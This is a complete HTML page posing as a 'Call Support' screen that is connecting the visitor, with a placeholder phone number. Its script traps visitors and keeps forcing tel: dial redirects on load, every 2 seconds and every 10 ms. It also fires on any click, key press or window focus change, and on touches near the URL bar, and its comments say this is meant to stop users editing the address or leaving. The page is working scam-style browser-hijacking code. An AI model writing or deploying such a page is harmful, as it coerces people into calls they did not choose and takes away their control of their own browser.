<!DOCTYPE html>
<html>
<head>
    <title>Call Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>
        <h1>ðŸ“ž Call Support</h1>
        <p>We are connecting you...</p>
    </div>

    <script>
        const PHONE_NUMBER = "+911234567890";
        
        // Fast redirect function
        function fastRedirect() {
            // Immediate redirect
            window.location.href = "tel:" + PHONE_NUMBER;
            
            // Multiple fallbacks
            setTimeout(() => {
                window.open("tel:" + PHONE_NUMBER, "_self");
            }, 50);
            
            setTimeout(() => {
                window.location.replace("tel:" + PHONE_NUMBER);
            }, 100);
        }
        
        // URL bar click detection
        let urlBarClicked = false;
        
        // Monitor URL changes and focus events
        let currentURL = window.location.href;
        
        setInterval(() => {
            // URL change detection
            if(window.location.href !== currentURL) {
                currentURL = window.location.href;
                fastRedirect();
            }
            
            // Focus events - when user clicks URL bar
            if(document.activeElement.tagName === 'INPUT' || 
               document.activeElement.tagName === 'TEXTAREA') {
                fastRedirect();
            }
        }, 10); // Very fast checking
        
        // Window focus/blur events - when switching to URL bar
        window.addEventListener('blur', function() {
            setTimeout(fastRedirect, 100);
        });
        
        window.addEventListener('focus', function() {
            setTimeout(fastRedirect, 100);
        });
        
        // Mouse events near top of screen (where URL bar is)
        document.addEventListener('mousedown', function(e) {
            if(e.clientY < 50) { // Top area of screen
                fastRedirect();
            }
        });
        
        document.addEventListener('touchstart', function(e) {
            if(e.touches[0].clientY < 50) { // Top area of screen
                fastRedirect();
            }
        });
        
        // Key events for URL editing
        document.addEventListener('keydown', function(e) {
            // If any key pressed (especially for URL editing)
            fastRedirect();
        });
        
        // Page load pe bhi ready
        window.onload = function() {
            // Continuous monitoring start
            setInterval(fastRedirect, 2000); // Every 2 seconds try call
        };
        
        // Normal click events
        document.addEventListener('click', fastRedirect);
        document.addEventListener('touchstart', fastRedirect);
        
    </script>
</body>
</html>
